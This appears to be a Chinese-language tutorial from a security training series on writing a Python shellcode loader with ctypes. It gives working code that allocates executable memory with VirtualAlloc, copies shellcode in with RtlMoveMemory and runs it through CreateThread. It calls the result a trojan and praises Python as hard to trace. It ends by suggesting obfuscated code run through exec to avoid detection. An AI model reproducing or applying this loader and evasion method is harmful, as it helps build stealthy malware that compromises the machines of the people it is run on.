ctypes



ctypes是Python的外部函数库。它提供了与 C语言兼容的数据类型，并允许调用 DLL 或共享库中的函数。可使用该模块以纯 Python 形式对这些库进行封装。我们可以利用上一期生成的C语言shellcode做一个python的shellcode loader来加载C语言的shellcode，python作为shellcode loader的支持语言训练营认为有两点优势：

  1. 开发简单容易内嵌进很多项目里

  2. 属于高级语言，不易溯源

import ctypesctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64

这里我们先申请一个64位的VirtualAlloc，
看到这个函数可以想到我们上一期的C语言的VirtualAlloc
没错这里的功能和上一期的一样都是为我们的shellcode申请内存的。
接下来我们确定VirtualAlloc的四要素
（地址、大小、类型、初始保护属性）
代码如下

ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int64(0),ctypes.c_int64(len(shellcode)),ctypes.c_int64(0x3000),ctypes.c_int64(0x40))
这就像我们上一期的C语言代码
void* exec = VirtualAlloc(0, sizeof ShellCode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
接下来我们进行内存的拷贝
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int64(ptr),buf,ctypes.c_int(len(shellcode)))
创建线程
handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int64(0),ctypes.c_int64(0),ctypes.c_uint64(ptr),ctypes.c_int64(0),ctypes.c_int64(0),ctypes.pointer(ctypes.c_int64(0)))
对线程进行保护，程序不关木马不断
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int64(handle), ctypes.c_int64(-1))

exec



exec 可以用来动态执行字符串代码，在for循环里面能快速执行大量类似于list1=1，list2=2，list3=3..这样的语句，使代码显得更加简洁。相比于 eval，exec可以执行更复杂的 Python 代码。

示例

exec("print('a')")

结果：a

可以看到即使是字符串我们的exec方法也会将其看作是python代码（只要语法正确的）


我们可以通过工具将对应的代码进行混淆然后再解码通过exec来执行
